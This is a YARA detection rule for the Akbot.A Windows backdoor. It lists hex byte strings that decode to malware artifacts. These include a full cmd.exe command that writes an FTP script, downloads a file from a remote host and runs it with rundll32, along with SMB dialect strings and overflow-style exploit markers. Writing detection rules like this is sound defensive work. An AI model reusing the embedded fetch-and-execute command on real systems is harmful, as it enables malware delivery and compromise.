
rule Backdoor_Win32_Akbot_A{
	meta:
		description = "Backdoor:Win32/Akbot.A,SIGNATURE_TYPE_PEHSTR_EXT,0b 00 0b 00 0b 00 00 "
		
	strings :
		$a_01_0 = {6e 6f 70 65 2e 64 6c 6c } //1 nope.dll
		$a_01_1 = {63 6d 64 2e 65 78 65 20 2f 43 20 65 63 68 6f 20 6f 70 65 6e 20 25 73 20 25 68 75 3e 78 26 65 63 68 6f 20 75 73 65 72 20 78 20 78 3e 3e 78 26 65 63 68 6f 20 62 69 6e 3e 3e 78 26 65 63 68 6f 20 67 65 74 20 25 73 3e 3e 78 26 65 63 68 6f 20 62 79 65 3e 3e 78 26 66 74 70 2e 65 78 65 20 2d 6e 20 2d 73 3a 78 26 64 65 6c 20 78 26 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 25 73 2c 73 74 61 72 74 } //1 cmd.exe /C echo open %s %hu>x&echo user x x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&ftp.exe -n -s:x&del x&rundll32.exe %s,start
		$a_00_2 = {50 43 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 } //1 PC NETWORK PROGRAM 1.0
		$a_01_3 = {4c 41 4e 4d 41 4e 31 2e 30 } //1 LANMAN1.0
		$a_01_4 = {57 69 6e 64 6f 77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70 73 20 33 2e 31 61 } //1 Windows for Workgroups 3.1a
		$a_01_5 = {43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 } //1 CACACACACACACACACACACACACACACA
		$a_01_6 = {76 3a 2a 20 7b 20 62 65 68 61 76 69 6f 72 3a 20 75 72 6c 28 23 64 65 66 61 75 6c 74 23 56 4d 4c 29 3b 20 7d } //1 v:* { behavior: url(#default#VML); }
		$a_01_7 = {6d 65 74 68 6f 64 3d 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 } //1 method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		$a_01_8 = {49 6e 74 65 72 6e 65 74 4f 70 65 6e 55 72 6c 41 } //1 InternetOpenUrlA
		$a_00_9 = {46 69 6e 64 4e 65 78 74 46 69 6c 65 41 } //1 FindNextFileA
		$a_01_10 = {43 72 65 61 74 65 54 6f 6f 6c 68 65 6c 70 33 32 53 6e 61 70 73 68 6f 74 } //1 CreateToolhelp32Snapshot
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_00_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_00_9  & 1)*1+(#a_01_10  & 1)*1) >=11
 
}